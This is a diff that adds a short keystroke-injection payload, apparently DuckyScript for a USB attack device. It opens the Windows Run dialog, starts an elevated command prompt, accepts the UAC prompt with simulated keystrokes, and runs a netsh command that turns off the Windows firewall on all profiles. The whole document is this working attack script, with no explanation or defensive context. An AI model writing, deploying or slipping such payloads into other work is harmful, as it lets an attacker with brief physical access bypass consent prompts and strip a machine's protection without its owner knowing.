@@ -1,0 +1,10 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 500
+STRING netsh advfirewall set allprofiles state off
+ENTER
